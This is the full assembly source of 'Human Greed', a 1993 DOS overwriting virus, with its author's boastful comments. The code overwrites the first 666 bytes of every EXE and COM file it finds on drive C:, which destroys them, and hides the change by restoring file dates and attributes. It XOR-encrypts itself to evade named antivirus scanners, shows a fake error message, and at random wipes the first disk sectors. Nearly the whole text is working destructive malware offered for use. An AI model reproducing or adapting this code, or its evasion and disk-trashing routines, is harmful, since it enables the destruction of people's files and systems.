; VirusName : Human Greed
; Origin    : Sweden
; Author    : The Unforgiven
; Date      : 20/12/93
;
; This is a "mutation" of the Infernal Demand virus, written by Metal
; Militia. Even if it's high modified, its ground is still the same. 

; This is yet another of this simple overwriting virus, and it's 
; nothing really to scream hurray for. This virus will search for
; exe or com files on drive C:, and then overwrite the first 666
; bytes, and therefor permantely destroy the victims. It used the
; "dot-dot" method for changing directory, and when all files are
; infected (overwritten), it will return to the original directory.

; The code is encrypted, thus making it hard to detect. Scan,
; MSAV, CPAV, FindViru, F-prot and TBScan can't find a shit. 
; Yes, Tbscan used to find this as the "Infernal" virus, but he
; with his 90% (nice try!) failed again!, how patetic!
;
; If a infected file is being run, it's 50% that it will display 
; this stupid "Program to big to fit in memory" message. Then
; if the message is printed on the screen, it'll throw the dice
; once more. If the number are 10 or lower, it'll simple wipe out
; the first sectors by overwrite them on your C: drive. This means
; that for each run, it's 5% that it'll "go-off". 

; The "message dump" to a file under c:\ has also been deleted.
; And the new routines wich are included are, encryption, 
; get/and restore directory, the randomizer, print faker, and
; of'cos the trash routine too.  Hope you enjoy the code!

;===============================================================================
;                   ****  HUMAN GREED ****
;===============================================================================

cseg            segment byte public
		assume  cs:cseg, ds:cseg
		org     100h

virus_start:
call encrypt_decrypt
jmp  encryption_start

write_virus:                                      ; write the virus to the
call encrypt_decrypt                              ; files, by overwriting
		  mov     dx,100h                 ; its beginning       
		  mov     ah,40h                  ; 
		  mov     cx,666                  ; How sadistical??
		  int     21h                     ;                            
		  call encrypt_decrypt            ; 
		  ret

encryption_value dw 0
encrypt_decrypt:
 mov    si,offset encryption_start
 mov    dx,encryption_value
 mov cx,(end_of_virus-encryption_start+1)/2            

xor_loop:
     xor word ptr cs:[si],dx
     add si,2
call fool_scan_for_TridenT_virus                ; must call this meaningless
     loop xor_loop                              ; routine, otherwise, infected
     ret                                        ; files will be reported by
fool_scan_for_TridenT_virus:                    ; SCAN as the "TridenT" virus. 
ret                                     
						; just return.
encryption_start:
; get current drive
		mov    ah,19h                   ; get current drive
		int    21h                      ;
		push   ax                       ;                      
; move to c:
		mov    ah,0Eh                   ;           
		mov    dl,02h                   ; drive C:
		int    21h

; get directory.
	  mov     ah,47h
	  xor     dl,dl
	  lea     si,[bp+infernal+2ch]
	  int     21h

great:
; find first files (starting .exe's).
		mov    dx,offset ExeMask        ; offset 'EXEMASK'
		mov    ah,4Eh                   ; find first
		int    21h                      ; via int21
		jnc    go_for_it                ; jmp if no ERROR

; if no exe's was found, just infect.COM files.
		mov     dx,offset ComMask       ; offset 'COMMASK'
		mov     ah,4Eh                  ; find first file
						;
again:                                          ;
		int     21h                     ;
		jc      chdir                   ; 

go_for_it:
		mov     ax,4300h                ; Get attribute of file
		mov     dx,9eh                  ; Pointer to name in DTA
		int     21h                     ;

		push    cx                      ; Push the attrib to stack

		mov     ax,4301h                ; Set attribute to
		xor     cx,cx                   ; normal
		int     21h                     ;

		mov     ax,3D02h                ; Open file
		mov     dx,9eh                  ; Pointer to name in DTA
		int     21h

		jc      next                    ; if error, get next file

		xchg    ax,bx                   ; Swap AX & BX
						; so the filehandle ends up
						; in BX

		mov     ax,5700h                ; Get file date
		int     21h                     ;


		push    cx                      ; Save file dates
		push    dx                      ;

mov encryption_value,50                         ; encryption_value.

call write_virus                                ; write to file(s).
		pop     dx                      ; Get the saved
		pop     cx                      ; filedates from the stack

		mov     ax,5701h                ; Set them back to the file
		int     21h                     ;

		mov     ah,3Eh                  ; Close the file
		int     21h                     ;
	       
		pop     cx                      ; Restore the attribs from


						; the stack.

		mov     dx,9eh                  ; Pointer to name in DTA
		mov     ax,4301h                ; Set them attributes back
		int     21h                     ;

next:
		mov     ah,4Fh                  ; now get the next file
		jmp     short again             ; and do it all over again

chdir:
; change directory to [..] and start infect again.
		mov      dx,offset dot_dot      ; offset 'updir'
		mov      ah,3bh                 ; change directory
		int      21h
		jnc      great                  ; jmp to great if no ERROR

exit:
; Throw the dice..
    mov ah,2ch                              ;
    int 21h                                 ;
    cmp dl,50
    ja real_quit                            ;
    jmp print

; no, quitting time, yet..

print:
; first print message.
	mov     ah,09h                      ; Print Fake message.
	mov     dx,offset sign              ; 
	int     21h                         ;                 

get_random:
; Throw of a die..
    mov ah,2ch                              ; Randomize.
    int 21h                                 ;
    cmp dl,10                               ;
    ja  real_quit                           ;
    jmp trash                               ; bad bad boy..


trash:
; Trash routine from Nowhere Man of [NuKE], thanks. 

	cli                             ;      
	mov     ah,2                    ; 2=C:
	cwd                             ; 
	mov     cx,0100h                ; 
	int     026h                    ; 
	JMP     REAL_QUIT

real_quit:
		pop     dx                      ;
		mov     ah,0Eh                  ; restore org. drive
		int     21h                     ;

; restore directory
		lea     dx,[bp+infernal+2ch]
		mov     ah,3bh
		int     21h

; time to quit
		 mov    ah,4ch                   ; return to prompt
		 int 21h                         ; via int21

; some data.

ExeMask         db      '*.EXE',0                ; tought one, huh?
ComMask         db      '*.COM',0                ; what is this, hm
dot_dot         db      '..',0                   ; '..'
Note            db      'That is not dead '
		db      'Which can eternal lie '
		db      'Yet with strange aeons '
		db      'Even death may die '
		db      'LiVe AfteR DeATH...'
		db      'Do not waste your time '
		db      'Searching For '
		db      'those wasted years! '
		db      '(c) 93/94 The Unforgiven/Immortal Riot '
		db      'Thanks to Raver and Metal Militia/IR '
truenote        db      'Maria K - Life is limited, love is forever... '
		db      'Open to reality, forever in love... '
sign            db      'Program too big to fit in memory$' ; fake message!
sadistical      db      ' ***HUMAN GREED*** The answer of all evil on earth! '
		db      'Do You Belive? '
		db      'Farwell!....'
end_of_virus:
infernal:
cseg            ends
		end     virus_start
